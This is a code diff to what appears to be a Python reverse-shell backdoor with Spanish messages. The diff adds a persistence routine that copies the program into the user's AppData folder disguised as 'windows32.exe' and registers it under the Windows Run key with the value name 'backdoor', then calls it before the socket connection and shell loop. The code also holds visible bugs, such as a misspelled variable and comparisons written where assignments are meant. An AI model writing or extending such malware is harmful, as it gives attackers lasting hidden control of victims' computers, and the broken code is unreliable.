@@ -8,6 +8,7 @@ import base64
 import requests
 import mss
 import time
+import shutil
 
 def admin_check():
     global admin
@@ -17,6 +18,12 @@ def admin_check():
         admid == "Error, privilegios insuficientes"
     else:
         admin == "Privilegios de administrador"
+
+def create_persistence():
+    location = os.environ['appdata'] + '\\windows32.exe'
+    if not os.path.exists(location):
+        shutil.copyfile(sys.executable,location)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + locations + '"', shell=True)
 
 def connection():
     while True:
@@ -97,6 +104,7 @@ def shell():
             else:
                 cliente.send(result)
 
+create_persistence()
 cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
 cliente.close()
